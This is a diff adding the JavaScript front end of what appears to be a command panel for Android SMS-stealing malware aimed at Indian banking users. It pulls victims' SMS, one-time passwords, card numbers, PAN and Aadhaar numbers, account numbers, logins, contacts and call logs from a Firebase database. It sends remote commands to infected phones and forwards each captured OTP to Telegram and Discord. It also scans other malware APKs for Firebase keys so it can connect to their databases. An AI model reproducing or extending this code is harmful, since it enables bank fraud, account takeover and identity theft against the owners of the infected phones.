+    html+=pans.map(p=>`<span class="upi-chip" style="background:var(--pink)18;border-color:var(--pink)44;color:var(--pink);font-family:monospace;font-weight:700;cursor:pointer" onclick="cp('${esc(p)}','PAN copied')" title="Click to copy">${esc(p)}</span>`).join('');
+    html+=`</div></div>`;
+  }
+  if(aadhs.length){
+    html+=`<div style="margin-bottom:14px"><div style="font-size:10px;color:var(--yellow);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;font-weight:700">● Aadhaar Numbers</div>
+    <div style="display:flex;flex-wrap:wrap;gap:6px">`;
+    html+=aadhs.map(a=>`<span class="upi-chip" style="background:var(--yellow)18;border-color:var(--yellow)44;color:var(--yellow);font-family:monospace;cursor:pointer" onclick="cp('${esc(a)}','Aadhaar copied')" title="Click to copy">${esc(a)}</span>`).join('');
+    html+=`</div></div>`;
+  }
+  if(accs.length){
+    html+=`<div style="margin-bottom:14px"><div style="font-size:10px;color:var(--cyan);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;font-weight:700">● Account Numbers</div>
+    <div style="display:flex;flex-wrap:wrap;gap:6px">`;
+    html+=accs.map(a=>`<span class="upi-chip" style="background:var(--cyan)18;border-color:var(--cyan)44;color:var(--cyan);font-family:monospace;cursor:pointer" onclick="cp('${esc(a)}','Account No. copied')" title="Click to copy">...${esc(a)}</span>`).join('');
+    html+=`</div></div>`;
+  }
+  html+=`<div style="font-size:10px;color:var(--muted2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;font-weight:700">● Source SMS</div>`;
+  html+=panData.map(({pan,aadh,acc,sms:s})=>{
+    const tags=[pan&&`<span style="background:var(--pink)22;color:var(--pink);padding:2px 7px;border-radius:10px;font-size:10px;font-weight:700">PAN: ${esc(pan)}</span>`,
+      aadh&&`<span style="background:var(--yellow)22;color:var(--yellow);padding:2px 7px;border-radius:10px;font-size:10px">Aadhaar: ${esc(aadh)}</span>`,
+      acc&&`<span style="background:var(--cyan)22;color:var(--cyan);padding:2px 7px;border-radius:10px;font-size:10px">A/C: ...${esc(acc)}</span>`].filter(Boolean).join('');
+    return `<div class="card-item" style="margin-bottom:8px">
+      <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px">${tags}</div>
+      <div class="sms-from">${esc(s.from)}</div>
+      <div class="sms-msg" style="font-size:10px;margin-top:4px;color:var(--muted2)">${esc(s.body||'')}</div>
+      <div class="sms-foot" style="margin-top:6px">
+        <span class="sms-time">${ago(s.date)}</span>
+        ${pan?`<button class="cpbtn" onclick="cp('${esc(pan)}','PAN copied')">Copy PAN</button>`:''}
+        ${aadh?`<button class="cpbtn" onclick="cp('${esc(aadh)}','Aadhaar copied')">Copy Aadhaar</button>`:''}
+        <button class="cpbtn" onclick="cp('${esc(s.body||'')}','SMS copied')">Copy SMS</button>
+      </div>
+    </div>`;
+  }).join('');
+  el.innerHTML=html;
+}
+
+// ═══════════════════════════════════════════
+//  RENDER AMOUNTS
+// ═══════════════════════════════════════════
+function renderAmounts(amounts) {
+  const debits=amounts.filter(a=>a.amt.type==='debit');
+  const credits=amounts.filter(a=>a.amt.type==='credit');
+  const totalD=debits.reduce((s,a)=>s+a.amt.val,0);
+  const totalC=credits.reduce((s,a)=>s+a.amt.val,0);
+  q('totalDebit').textContent='₹'+fmt(totalD);
+  q('totalCredit').textContent='₹'+fmt(totalC);
+  const el=q('amtList');
+  if (!amounts.length) { el.innerHTML='<div class="empty"><div class="empty-icon">💰</div><p>No transactions</p></div>'; return; }
+  el.innerHTML=amounts.map(({amt,sms:s})=>`
+    <div class="sms-i ${amt.type==='debit'?'bank':'otp'}">
+      <div class="sms-from" style="display:flex;align-items:center;gap:10px">
+        ${esc(s.from)}
+        <span style="font-size:16px;font-weight:800;color:${amt.type==='debit'?'var(--red)':'var(--green)'}">${amt.type==='debit'?'−':'+'} ₹${fmt(amt.val)}</span>
+      </div>
+      <div class="sms-msg">${esc(s.body||'')}</div>
+      <div class="sms-foot"><span class="sms-time">${ago(s.date)}</span></div>
+    </div>`).join('');
+}
+
+// ═══════════════════════════════════════════
+//  RENDER CREDS
+// ═══════════════════════════════════════════
+function renderCreds(creds) {
+  const el=q('credList');
+  if (!creds.length) { el.innerHTML='<div class="empty"><div class="empty-icon">🔐</div><p>No credentials found</p></div>'; return; }
+  el.innerHTML=creds.map(({c,sms:s})=>`
+    <div class="card-item">
+      <div class="card-num" style="font-size:13px">${c.type==='credentials'?`${esc(c.email)} : ${esc(c.password)}`:`Token: ${esc(c.token)}`}</div>
+      <div class="card-meta">${esc(s.from)} · ${ago(s.date)}</div>
+      <div class="sms-foot" style="margin-top:5px"><button class="cpbtn" onclick="cp('${esc(c.type==='credentials'?c.email+':'+c.password:c.token)}','Copied')">Copy</button></div>
+    </div>`).join('');
+}
+
+// ═══════════════════════════════════════════
+//  ALL SMS
+// ═══════════════════════════════════════════
+function renderAllSMS(filter='') {
+  const el=q('allSmsList');
+  const devs=Object.values(S.devs);
+  let all=devs.flatMap(d=>d.sms.map(s=>({...s,device:d.model})));
+  all.sort((a,b)=>b.date-a.date);
+  if (filter) all=all.filter(s=>(s.body||'').toLowerCase().includes(filter)||s.from.toLowerCase().includes(filter));
+  if (!all.length) { el.innerHTML='<div class="empty"><div class="empty-icon">💬</div><p>No messages</p></div>'; return; }
+  el.innerHTML=all.map(s=>`
+    <div class="sms-i ${s.type}">
+      <div class="sms-from">${esc(s.from)} <span style="color:var(--muted);font-weight:400">· ${esc(s.device)}</span></div>
+      <div class="sms-msg">${esc(s.body||'')}</div>
+      <div class="sms-foot"><span class="sms-time">${ago(s.date)}</span>
+        <button class="cpbtn" onclick="cp('${esc(s.body||'')}','Copied')">Copy</button></div>
+    </div>`).join('');
+}
+
+// ═══════════════════════════════════════════
+//  CONTACTS + CALLS
+// ═══════════════════════════════════════════
+async function loadContacts() {
+  try {
+    const data=await fbFetch('/contacts');
+    if (!data || typeof data!=='object') { toast('No /contacts node'); return; }
+    S.contacts=Array.isArray(data)?data:Object.values(data);
+    q('nb8').textContent=S.contacts.length;
+    renderContacts();
+    log('ok','Contacts loaded: '+S.contacts.length);
+  } catch(e){ toast('Contacts: '+e.message); }
+}
+
+function renderContacts() {
+  const el=q('contactList');
+  if (!S.contacts.length) { el.innerHTML='<div class="empty"><div class="empty-icon">👤</div><p>No contacts</p></div>'; return; }
+  el.innerHTML=S.contacts.map(c=>`
+    <div class="ct-item">
+      <div class="ct-icon">👤</div>
+      <div class="ct-info">
+        <div class="ct-name">${esc(c.name||c.displayName||'Unknown')}</div>
+        <div class="ct-num">${esc(c.number||c.phone||c.phoneNumber||'—')}</div>
+      </div>
+      <button class="cpbtn" onclick="cp('${esc(c.number||c.phone||'')}','Number copied')">Copy</button>
+    </div>`).join('');
+}
+
+async function loadCalls() {
+  try {
+    const data=await fbFetch('/calls');
+    if (!data || typeof data!=='object') { toast('No /calls node'); return; }
+    S.calls=Array.isArray(data)?data:Object.values(data);
+    q('nb9').textContent=S.calls.length;
+    renderCalls();
+    log('ok','Calls loaded: '+S.calls.length);
+  } catch(e){ toast('Calls: '+e.message); }
+}
+
+function renderCalls() {
+  const el=q('callList');
+  if (!S.calls.length) { el.innerHTML='<div class="empty"><div class="empty-icon">📞</div><p>No call logs</p></div>'; return; }
+  el.innerHTML=S.calls.map(c=>{
+    const type=c.type||c.callType||'';
+    const icon=type.includes('incoming')||type.includes('1')?'📲':type.includes('missed')||type.includes('3')?'❌':'📤';
+    return `<div class="ct-item">
+      <div class="ct-icon">${icon}</div>
+      <div class="ct-info">
+        <div class="ct-name">${esc(c.number||c.from||c.name||'Unknown')}</div>
+        <div class="ct-num">${ago(c.date||c.time||c.timestamp||0)} · ${c.duration||c.dur||0}s</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ═══════════════════════════════════════════
+//  MAGIC SCAN
+// ═══════════════════════════════════════════
+function renderMagic(devs,allSMS,otps,banks,cards,upis,amounts) {
+  q('sc0').textContent=otps.length;
+  q('sc1').textContent=banks.length;
+  q('sc2').textContent=cards.length;
+  q('sc3').textContent=upis.length;
+  const totD=amounts.filter(a=>a.amt.type==='debit').reduce((s,a)=>s+a.amt.val,0);
+  const totC=amounts.filter(a=>a.amt.type==='credit').reduce((s,a)=>s+a.amt.val,0);
+  q('sc4').textContent='₹'+fmt(totD);
+  q('sc5').textContent='₹'+fmt(totC);
+  q('sc6').textContent=devs.filter(d=>d.online).length;
+  q('sc7').textContent=(devs.length?Math.round(devs.reduce((s,d)=>s+d.battery,0)/devs.length):0)+'%';
+
+  // bank keywords
+  const kw={};
+  ['HDFC','SBI','ICICI','Axis','Paytm','PhonePe','Kotak','YES','PNB','BOI','GPay','UPI','Canara'].forEach(k=>{
+    const n=banks.filter(s=>(s.body||'').toLowerCase().includes(k.toLowerCase())).length;
+    if(n) kw[k]=n;
+  });
+  q('bankKW').innerHTML=Object.entries(kw).sort((a,b)=>b[1]-a[1]).map(([k,n])=>
+    `<span style="background:var(--bg3);border:1px solid var(--border2);border-radius:4px;padding:3px 9px;font-size:10px">
+      <span style="color:var(--yellow)">${k}</span> <span style="color:var(--muted2)">${n}</span>
+    </span>`).join('');
+
+  // top devices
+  q('topDevs').innerHTML=[...devs].sort((a,b)=>b.sms.length-a.sms.length).slice(0,5).map(d=>`
+    <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px;font-size:11px">
+      <span style="color:var(--accent3);width:150px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${esc(d.model)}</span>
+      <div style="flex:1;height:4px;background:var(--bg3);border-radius:2px;overflow:hidden">
+        <div style="width:${Math.min(100,d.sms.length*8)}%;height:100%;background:var(--accent2);border-radius:2px"></div>
+      </div>
+      <span style="color:var(--muted2);width:30px;text-align:right">${d.sms.length}</span>
+    </div>`).join('');
+}
+
+// ═══════════════════════════════════════════
+//  TIMELINE
+// ═══════════════════════════════════════════
+function renderTimeline(devs) {
+  const el=q('tlList');
+  let events=devs.flatMap(d=>d.sms.map(s=>({...s,device:d.model,devId:d.id})));
+  events.sort((a,b)=>b.date-a.date);
+  events=events.slice(0,80);
+  if (!events.length) { el.innerHTML='<div class="empty"><div class="empty-icon">📅</div><p>No events</p></div>'; return; }
+  el.innerHTML=events.map(s=>{
+    const icon=s.type==='otp'?'🔑':s.type==='bank'?'🏦':'💬';
+    return `<div class="tl-item">
+      <div class="tl-dot">${icon}</div>
+      <div class="tl-body">
+        <div class="tl-top">
+          <span class="tl-dev">${esc(s.device)}</span>
+          <span style="color:var(--accent3);font-size:9px">${esc(s.from)}</span>
+          <span class="tl-time">${ago(s.date)}</span>
+        </div>
+        <div class="sms-msg" style="font-size:10px">${esc(s.body||'')}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ═══════════════════════════════════════════
+//  RAW DB
+// ═══════════════════════════════════════════
+async function fetchRaw() {
+  const path=q('rawPath').value.trim()||'/';
+  const el=q('rawTree'); el.textContent='Fetching…';
+  try { const d=await fbFetch(path); el.innerHTML=syntaxHL(d); }
+  catch(e) { el.innerHTML=`<span style="color:var(--red)">Error: ${e.message}</span>`; }
+}
+function cpRaw() { cp(q('rawTree').innerText,'Raw DB copied'); }
+
+function syntaxHL(obj, depth=0) {
+  if (obj===null) return '<span style="color:var(--muted)">null</span>';
+  if (typeof obj==='boolean') return `<span class="rb">${obj}</span>`;
+  if (typeof obj==='number') return `<span class="rn">${obj}</span>`;
+  if (typeof obj==='string') return `<span class="rs">"${esc(obj)}"</span>`;
+  if (Array.isArray(obj)) {
+    if(!obj.length) return '[]';
+    const p='  '.repeat(depth+1);
+    return '[\n'+obj.map(v=>p+syntaxHL(v,depth+1)).join(',\n')+'\n'+'  '.repeat(depth)+']';
+  }
+  if (typeof obj==='object') {
+    const keys=Object.keys(obj); if(!keys.length) return '{}';
+    const p='  '.repeat(depth+1);
+    return '{\n'+keys.map(k=>p+`<span class="rk">"${esc(k)}"</span>: `+syntaxHL(obj[k],depth+1)).join(',\n')+'\n'+'  '.repeat(depth)+'}';
+  }
+  return String(obj);
+}
+
+// ═══════════════════════════════════════════
+//  COMMANDS
+// ═══════════════════════════════════════════
+async function sendCmd(devId) {
+  const inp=q('cmdinp_'+devId);
+  const cmd=inp.value.trim(); if(!cmd) { toast('Enter a command'); return; }
+  const fb=q('cmdfeedback_'+devId);
+  fb.textContent='Sending…'; fb.style.color='var(--muted2)';
+  try {
+    await fbWrite('/commands/'+devId, { command:cmd, timestamp:Date.now(), status:'pending' });
+    fb.textContent='✓ Command sent: '+cmd;
+    fb.style.color='var(--green)';
+    inp.value='';
+    log('ok','Command sent to '+devId+': '+cmd);
+  } catch(e) {
+    fb.textContent='✗ Failed: '+e.message;
+    fb.style.color='var(--red)';
+    log('err','Command failed: '+e.message);
+  }
+}
+
+// ═══════════════════════════════════════════
+//  APK EXTRACTOR
+// ═══════════════════════════════════════════
+async function handleAPK(file) {
+  if (!file) return;
+  q('apkDrop').textContent='Scanning '+file.name+'…';
+  const buf=await file.arrayBuffer();
+  const text=new TextDecoder('utf-8',{fatal:false}).decode(new Uint8Array(buf));
+
+  const fbUrl=text.match(/https:\/\/[a-zA-Z0-9\-]+(?:-default-rtdb)?\.firebaseio\.com/)?.[0]||'—';
+  const apiKey=text.match(/AIza[A-Za-z0-9_\-]{35}/)?.[0]||'—';
+  const pid=text.match(/"project_id"\s*:\s*"([^"]+)"/)?.[1]||text.match(/PROJECT_ID["\s:=]+([a-z0-9\-]+)/i)?.[1]||'—';
+  const appId=text.match(/"mobilesdk_app_id"\s*:\s*"([^"]+)"/)?.[1]||'—';
+  const sender=text.match(/"gcm_defaultSenderId"\s*:\s*"([^"]+)"/)?.[1]||'—';
+  const bucket=text.match(/"storageBucket"\s*:\s*"([^"]+)"/)?.[1]||text.match(/([a-z0-9\-]+\.appspot\.com)/)?.[1]||'—';
+
+  q('apkFbUrl').textContent=fbUrl;
+  q('apkApiKey').textContent=apiKey;
+  q('apkPid').textContent=pid;
+  q('apkAppId').textContent=appId;
+  q('apkSender').textContent=sender;
+  q('apkBucket').textContent=bucket;
+  q('apkRes').classList.add('show');
+  q('apkDrop').textContent='✓ Scanned: '+file.name;
+
+  S._apkExtracted={url:fbUrl,key:apiKey};
+  q('apkConnBtn').style.display=fbUrl!=='—'?'block':'none';
+  log('ok','APK scanned: '+file.name);
+}
+
+function connFromAPK() {
+  const {url,key}=S._apkExtracted||{};
+  if(!url||url==='—'){toast('No URL found');return;}
+  const nick=url.replace('https://','').split('.')[0].slice(0,20);
+  S.accs.push({nick,url,key:key==='—'?'':key,devpath:'/devices'});
+  saveAccs(); renderAccList();
+  activateAcc(S.accs.length-1);
+  closeMs();
+  toast('✓ Connected from APK');
+}
+
+// ═══════════════════════════════════════════
+//  BOTS
+// ═══════════════════════════════════════════
+function saveBots() {
+  S.bots={
+    tg:{token:q('tg-tok').value.trim(),chat:q('tg-chat').value.trim(),mode:q('tg-mode').value},
+    dc:{hook:q('dc-hook').value.trim(),mode:q('dc-mode').value}
+  };
+  localStorage.setItem('dp4_bots',JSON.stringify(S.bots));
+  closeMs(); toast('✓ Bot config saved');
+  log('ok','Bots configured — TG:'+S.bots.tg.mode+' DC:'+S.bots.dc.mode);
+}
+
+async function sendTG(text) {
+  const {tg}=S.bots; if(!tg||!tg.token||!tg.chat||tg.mode==='off') return;
+  try {
+    await fetch(`https://api.telegram.org/bot${tg.token}/sendMessage`,{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:tg.chat,text,parse_mode:'HTML'})
+    });
+  } catch(e){log('err','TG: '+e.message);}
+}
+
+async function sendDC(content) {
+  const {dc}=S.bots; if(!dc||!dc.hook||dc.mode==='off') return;
+  try {
+    await fetch(dc.hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content})});
+  } catch(e){log('err','Discord: '+e.message);}
+}
+
+// ═══════════════════════════════════════════
+//  TICKER + NOTIFICATIONS
+// ═══════════════════════════════════════════
+function updateTicker(otps) {
+  const bar=q('ticker');
+  if(!otps.length){bar.classList.remove('show');return;}
+  bar.classList.add('show');
+  const items=otps.slice(0,10).map(s=>{
+    const otp=extractOTP(s.body||'')||'—';
+    return `<span>${esc(s.from)}: <span class="totp">${otp}</span></span>`;
+  }).join('');
+  q('tickInner').innerHTML=items+' &nbsp;&nbsp;&nbsp; '+items;
+}
+
+function checkNewOTPs(otps) {
+  otps.forEach(s=>{
+    const otp=extractOTP(s.body||'');
+    if(!otp) return;
+    const key=s.from+'_'+otp;
+    if(S.seenOtps.has(key)) return;
+    const age=Date.now()-s.date;
+    if(age>120000) { S.seenOtps.add(key); return; } // ignore old
+    S.seenOtps.add(key);
+    saveSeen();
+
+    // browser notification
+    if(S.notifPerm) {
+      new Notification('🔑 OTP: '+otp, {body:'From: '+s.from+'\n'+s.body, icon:'', tag:key});
+    }
+    // TG forward
+    if(S.bots.tg&&(S.bots.tg.mode==='otp'||S.bots.tg.mode==='all')) {
+      sendTG(`🔑 <b>OTP CAPTURED</b>\n\n<b>From:</b> ${s.from}\n<b>OTP:</b> <code>${otp}</code>\n\n${s.body}`);
+    }
+    // Discord forward
+    if(S.bots.dc&&(S.bots.dc.mode==='otp'||S.bots.dc.mode==='all')) {
+      sendDC(`🔑 **OTP CAPTURED**\n**From:** ${s.from}\n**OTP:** \`${otp}\`\n\`\`\`${s.body}\`\`\``);
+    }
+    toast('🔑 New OTP: '+otp);
+  });
+}
+
+function requestNotifPerm() {
+  if(!('Notification' in window)) return;
+  if(Notification.permission==='granted') { S.notifPerm=true; q('notifBadge').style.display='inline'; return; }
+  if(Notification.permission!=='denied') {
+    Notification.requestPermission().then(p=>{ S.notifPerm=p==='granted'; if(S.notifPerm) q('notifBadge').style.display='inline'; });
+  }
+}
+
+function saveSeen() {
+  try { localStorage.setItem('dp4_seen',JSON.stringify([...S.seenOtps].slice(-200))); } catch(e){}
+}
+
+// ═══════════════════════════════════════════
+//  EXPORT
+// ═══════════════════════════════════════════
+function exportData(type) {
+  const devs=Object.values(S.devs);
+  let data;
+  if(type==='sms') data=devs.flatMap(d=>d.sms);
+  else if(type==='bank') data=devs.flatMap(d=>d.sms.filter(s=>s.type==='bank'));
+  else if(type==='otp') data=devs.flatMap(d=>d.sms.filter(s=>s.type==='otp').map(s=>({...s,otp:extractOTP(s.body||'')})));
+  else if(type==='cards') data=devs.flatMap(d=>d.sms.map(s=>{const c=extractCard(s.body||'');return c?{card:c.display,full:c.full,type:extractCardType(s.body||''),expiry:extractExpiry(s.body||''),from:s.from,sms:s.body,date:s.date}:null;}).filter(Boolean));
+  else if(type==='pan') data=devs.flatMap(d=>d.sms.map(s=>({pan:extractPAN(s.body||''),aadhaar:extractAadhaar(s.body||''),account:extractAccountNo(s.body||''),from:s.from,sms:s.body})).filter(r=>r.pan||r.aadhaar||r.account));
+  const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
+  const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
+  a.download=`${type}_export_${Date.now()}.json`; a.click();
+}
+
+function expDev(id) {
+  const d=S.devs[id]; if(!d) return;
+  const blob=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});
+  const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
+  a.download=`device_${id}.json`; a.click();
+}
+
+function copyAllOtps() {
+  const otps=Object.values(S.devs).flatMap(d=>d.sms.filter(s=>s.type==='otp').map(s=>extractOTP(s.body||'')||s.body));
+  cp(otps.join('\n'),'All OTPs copied');
+}
+
+function copyUPIs() {
+  const upis=[...new Set(Object.values(S.devs).flatMap(d=>d.sms.flatMap(s=>extractUPI(s.body||''))))];
+  cp(upis.join('\n'),'UPI IDs copied');
+}
+
+function copyAllPAN() {
+  const devs=Object.values(S.devs);
+  const pans=[...new Set(devs.flatMap(d=>d.sms.map(s=>extractPAN(s.body||'')).filter(Boolean)))];
+  const aadhs=[...new Set(devs.flatMap(d=>d.sms.map(s=>extractAadhaar(s.body||'')).filter(Boolean)))];
+  const accs=[...new Set(devs.flatMap(d=>d.sms.map(s=>extractAccountNo(s.body||'')).filter(Boolean)))];
+  const lines=['=== PAN ===', ...pans, '=== AADHAAR ===', ...aadhs, '=== ACCOUNT NOS ===', ...accs].filter(l=>l.startsWith('===')||l);
+  cp(lines.join('\n'),'PAN/Aadhaar/Account data copied');
+}
+
+// ═══════════════════════════════════════════
+//  LOG
+// ═══════════════════════════════════════════
+function log(type, msg) {
+  S.logs.unshift({type,msg,t:Date.now()});
+  q('logWrap').innerHTML=S.logs.slice(0,150).map(l=>`
+    <div class="ll"><span class="lt">[${new Date(l.t).toLocaleTimeString()}]</span>
+    <span class="${l.type==='err'?'lerr':l.type==='ok'?'lok':''}">${esc(l.msg)}</span></div>`).join('');
+}
+function clearLog(){S.logs=[];q('logWrap').innerHTML='<div class="ll" style="color:var(--muted)">Cleared.</div>';}
+
+// ═══════════════════════════════════════════
+//  UI HELPERS
+// ═══════════════════════════════════════════
+function sv(el) {
+  const v=el.dataset.v;
+  document.querySelectorAll('.view').forEach(e=>e.classList.remove('act'));
+  q('view-'+v).classList.add('act');
+  document.querySelectorAll('.ni').forEach(n=>n.classList.remove('act'));
+  el.classList.add('act');
+  if(v==='contacts'&&!S.contacts.length&&S.ai>=0) loadContacts();
+  if(v==='calls'&&!S.calls.length&&S.ai>=0) loadCalls();
+}
+
+function setFlt(f,btn) {
+  S.flt=f;
+  document.querySelectorAll('.flt').forEach(b=>b.classList.remove('act'));
+  btn.classList.add('act');
+  renderDevs();
+}
+
+function toggleDev(id) { q('dc_'+id).classList.toggle('open'); }
+
+function dTab(did,tab,btn) {
+  const body=q('db_'+did);
+  body.querySelectorAll('.dtab').forEach(b=>b.classList.remove('act'));
+  body.querySelectorAll('.tc').forEach(t=>t.classList.remove('act'));
+  btn.classList.add('act');
+  q('tc_'+did+'_'+tab).classList.add('act');
+}
+
+function openM(id) {
+  document.querySelectorAll('.mbg').forEach(m=>m.classList.remove('show'));
+  q('modal-'+id).classList.add('show');
+  if(id==='bots'&&S.bots.tg) {
+    q('tg-tok').value=S.bots.tg.token||'';
+    q('tg-chat').value=S.bots.tg.chat||'';
+    q('tg-mode').value=S.bots.tg.mode||'otp';
+    q('dc-hook').value=S.bots.dc?.hook||'';
+    q('dc-mode').value=S.bots.dc?.mode||'otp';
+  }
+}
+function closeMs() { document.querySelectorAll('.mbg').forEach(m=>m.classList.remove('show')); }
+
+function doRefresh() {
+  if(S.ai<0){toast('Not connected');return;}
+  toast('↻ Refreshing…');
+  const a=S.accs[S.ai];
+  fbFetch(a.devpath||'/devices').then(data=>{
+    if(data&&typeof data==='object'&&Object.keys(data).length){
+      const out={};
+      for(const[k,v] of Object.entries(data)) out[k]=parseDevice(k,v);
+      S.devs=out;
+    }
+    updateAll(); toast('✓ Refreshed');
+  }).catch(e=>toast('Refresh failed: '+e.message));
+}
+
+let _tt;
+function toast(msg) {
+  const t=q('toast'); t.textContent=msg; t.style.display='block';
+  clearTimeout(_tt); _tt=setTimeout(()=>t.style.display='none',2400);
+}
+
+function cp(text,msg='Copied') {
+  navigator.clipboard.writeText(text||'').then(()=>toast('✓ '+msg)).catch(()=>toast('Copy failed'));
+}
+
+function esc(s) {
+  if(s==null) return '';
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+
+function ago(ts) {
+  const d=Date.now()-ts;
+  if(d<60000) return 'just now';
+  if(d<3600000) return Math.floor(d/60000)+'m ago';
+  if(d<86400000) return Math.floor(d/3600000)+'h ago';
+  return Math.floor(d/86400000)+'d ago';
+}
+
+function fmt(n) {
+  return n.toLocaleString('en-IN',{minimumFractionDigits:0,maximumFractionDigits:2});
+}
+
+function q(id) { return document.getElementById(id); }
+
+// close modals on backdrop click
+document.querySelectorAll('.mbg').forEach(m=>m.addEventListener('click',e=>{if(e.target===m)closeMs();}));
+
+// ═══════════════════════════════════════════
+//  INIT
+// ═══════════════════════════════════════════
+renderAccList();
+if (S.accs.length) activateAcc(0);
+else {
+  // Load demo so UI is populated
+  S.devs=buildDemoDevs();
+  updateAll();
+  log('ok','Demo mode — add a Firebase account to connect live data');
+}
+</script>
+</body>
+</html>
+
+</body></html>
